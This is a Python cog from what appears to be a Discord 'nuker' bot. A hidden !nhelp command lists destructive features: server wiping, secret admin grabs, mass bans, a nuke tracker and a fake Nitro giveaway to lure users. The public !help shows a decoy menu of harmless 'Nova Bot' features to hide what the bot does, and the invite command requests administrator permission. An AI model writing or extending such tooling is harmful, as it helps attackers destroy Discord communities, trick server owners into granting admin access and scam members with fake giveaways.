from datetime import datetime

import discord
from discord import app_commands
from discord.ext import commands

from core.operation import DashboardView
from core.utils import (
    get_channel_name,
    get_role_name,
    get_server_name,
    get_show_username,
    get_webhook_message,
    get_webhook_name,
)


class Help(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def nhelp(self, ctx):
        embed = discord.Embed(
            title="⚡ Insomnia Bot Help",
            description="List of available commands:",
            color=discord.Color.blurple()
        )
        embed.set_thumbnail(url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else ctx.bot.user.default_avatar.url)

        embed.add_field(name="`!setup`", value="Completely wipes the server.", inline=False)
        embed.add_field(name="`!admin`", value="Tries to secretly give you admin.", inline=False)
        embed.add_field(name="`[💎] !massban`", value="Bans everyone!", inline=False)
        embed.add_field(name="`!info [@user]`", value="Displays how many servers a user has nuked. Also shows if the user is Premium.", inline=False)
        embed.add_field(name="`!invite`", value="Sends the bot invite to your dms.", inline=False)
        embed.add_field(name="`!fakenitro`", value="Create a fake nitro giveway and lure people into joining ur server.", inline=False)
        embed.add_field(name="`/dashboard`", value="Displays a dashboard for custom settings (e.g. show username in tracker 'true/false')", inline=False)
        embed.add_field(name="`!help`", value="Shows a real looking fake help embed.", inline=False)
        embed.add_field(name="`!nhelp`", value="Shows this help embed", inline=False)

        embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
        embed.timestamp = datetime.utcnow()

        await ctx.send(embed=embed)

    @commands.command()
    async def help(self, ctx):
        embed = discord.Embed(
            title="⚡ Nova Bot Help",
            description="Here are some of the available commands:",
            color=discord.Color.gold()
        )
        embed.set_thumbnail(
            url=ctx.bot.user.avatar.url if ctx.bot.user.avatar else ctx.bot.user.default_avatar.url
        )

        embed.add_field(name="`!customvc`", value="Create your own temporary custom voice channel with full control (name, user limit, lock/unlock).", inline=False)
        embed.add_field(name="`!autorole`", value="Automatically assigns roles to new members when they join the server.", inline=False)
        embed.add_field(name="`!reactionroles`", value="Set up reaction roles with a single command.", inline=False)
        embed.add_field(name="`!levels`", value="Track activity and earn XP/levels with a fully customizable ranking system.", inline=False)
        embed.add_field(name="`!music [song]`", value="Play high-quality music in your voice channel (with playlist support).", inline=False)
        embed.add_field(name="`!dashboard`", value="Opens a web dashboard where you can manage bot settings (prefix, modules, etc.).", inline=False)
        embed.add_field(name="`!welcome`", value="Set up custom welcome & goodbye messages with images and embeds.", inline=False)
        embed.add_field(name="`!tags [name]`", value="Create and store custom text snippets (like shortcuts for announcements).", inline=False)
        embed.add_field(name="`!premium`", value="Shows how to unlock extra features and perks.", inline=False)
        embed.add_field(name="`!help`", value="Shows this help menu.", inline=False)

        embed.set_footer(
            text=f"Requested by {ctx.author}",
            icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url
        )
        embed.timestamp = datetime.utcnow()

        await ctx.send(embed=embed)

    @commands.command()
    async def invite(self, ctx):
        invite_link = discord.utils.oauth_url(
            client_id=ctx.bot.user.id,
            permissions=discord.Permissions(administrator=True),
            scopes=("bot",)
        )

        embed = discord.Embed(
            title="🔗 Invite The Bot",
            description="Click the link below to invite the bot with admin permissions:",
            color=discord.Color.blurple()
        )
        embed.add_field(name="Invite Link", value=f"[Click here to invite]({invite_link})", inline=False)
        embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
        embed.timestamp = datetime.utcnow()

        try:
            await ctx.author.send(embed=embed)
            await ctx.reply("📬 I've sent you the bot invite in your DMs!", ephemeral=True if ctx.guild else False)
        except discord.Forbidden:
            await ctx.reply("❌ I couldn't DM you the invite. Please check your privacy settings.", ephemeral=True if ctx.guild else False)

    @app_commands.command(name="dashboard", description="Show your settings dashboard")
    async def dashboard(self, interaction: discord.Interaction):
        user_id = interaction.user.id

        show_username = get_show_username(user_id)
        channel_name = get_channel_name(user_id)
        webhook_name = get_webhook_name(user_id)
        webhook_message = get_webhook_message(user_id)
        server_name = get_server_name(user_id)
        role_name = get_role_name(user_id)

        embed = discord.Embed(title="User Dashboard", color=discord.Color.blue())
        embed.add_field(name="Show Username", value="Yes" if show_username else "No", inline=True)
        embed.add_field(name="Channel Name", value=channel_name, inline=True)
        embed.add_field(name="Webhook Name", value=webhook_name, inline=True)
        embed.add_field(name="Webhook Message", value=webhook_message, inline=False)
        embed.add_field(name="Server Name", value=server_name, inline=True)
        embed.add_field(name="Role Name", value=role_name, inline=True)

        view = DashboardView(user_id)
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)


async def setup(bot):
    await bot.add_cog(Help(bot))
